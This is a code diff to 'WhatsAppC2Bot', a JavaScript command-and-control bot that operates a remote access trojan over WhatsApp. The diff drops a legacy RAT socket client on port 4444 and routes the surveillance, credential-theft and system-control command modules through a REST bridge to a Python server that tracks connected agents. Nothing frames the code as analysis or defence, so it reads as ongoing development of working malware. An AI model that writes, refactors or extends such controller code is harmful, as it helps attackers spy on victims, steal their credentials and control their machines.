@@ -9,7 +9,6 @@ import pino from 'pino';
 import chalk from 'chalk';
 import fs from 'fs';
 import { ResponseFormatter } from './utils/formatter.js';
-import { RATClient } from './utils/ratClient.js';
 import { APIBridgeClient } from './utils/apiBridgeClient.js';
 import { APICommandHandlers } from './utils/apiCommandHandlers.js';
 import { HelpHandler } from './utils/helpHandler.js';
@@ -29,7 +28,6 @@ class WhatsAppC2Bot {
     this.yamlConfig = new ConfigLoader();  // Load from umbrella_config.yaml
     this.config = this.loadConfig();        // Merge with local config.json
     this.sock = null;
-    this.ratClient = null;
     this.apiBridge = null;                  // REST API bridge for Python server
     this.currentSession = null;
     this.commandPrefix = this.config.whatsapp.prefix;
@@ -102,9 +100,9 @@ class WhatsAppC2Bot {
   }
 
   /**
-   * Initialize API Bridge and RAT client connection
+   * Initialize API Bridge connection to Python server
    */
-  async initRATClient() {
+  async initAPIBridge() {
     try {
       // Initialize REST API bridge to Python server
       this.apiBridge = new APIBridgeClient();
@@ -117,18 +115,6 @@ class WhatsAppC2Bot {
         
         // Load connected agents
         await this.syncAgents();
-        
-        // Keep legacy RATClient for backward compatibility
-        const host = this.config.ratServer.host || '127.0.0.1';
-        const port = this.config.ratServer.port || 4444;
-        const key = this.config.ratServer.encryptionKey || 'YOUR_ENCRYPTION_KEY_HERE';
-        this.ratClient = new RATClient(host, port, key);
-        
-        try {
-          await this.ratClient.connect();
-        } catch (e) {
-          ResponseFormatter.log('warning', 'Legacy RAT connection optional when using API bridge');
-        }
       } else {
         throw new Error(`Server unhealthy: ${health.message}`);
       }
@@ -156,16 +142,17 @@ class WhatsAppC2Bot {
   }
 
   /**
-   * Initialize command modules
+   * Initialize command modules with API Bridge
    */
   initCommandModules() {
-    this.surveillanceCmd = new SurveillanceCommands(this.ratClient, this.sock);
-    this.credentialCmd = new CredentialCommands(this.ratClient, this.sock);
-    this.systemCmd = new SystemCommands(this.ratClient, this.sock);
-    this.funCmd = new FunCommands(this.ratClient, this.sock);
+    // Initialize with API Bridge only
+    this.surveillanceCmd = new SurveillanceCommands(this.apiBridge, this.sock);
+    this.credentialCmd = new CredentialCommands(this.apiBridge, this.sock);
+    this.systemCmd = new SystemCommands(this.apiBridge, this.sock);
+    this.funCmd = new FunCommands(this.apiBridge, this.sock);
     this.apiCmd = new APICommandHandlers(this.apiBridge, this.sock);
     
-    ResponseFormatter.log('success', 'Command modules initialized (including REST API bridge)');
+    ResponseFormatter.log('success', 'Command modules initialized with REST API bridge');
   }
 
   /**
@@ -711,8 +698,8 @@ class WhatsAppC2Bot {
   async start() {
     this.printBanner();
     
-    // Initialize RAT client
-    await this.initRATClient();
+    // Initialize API Bridge connection
+    await this.initAPIBridge();
 
     // Setup auth
     const { state, saveCreds } = await useMultiFileAuthState('./sessions');
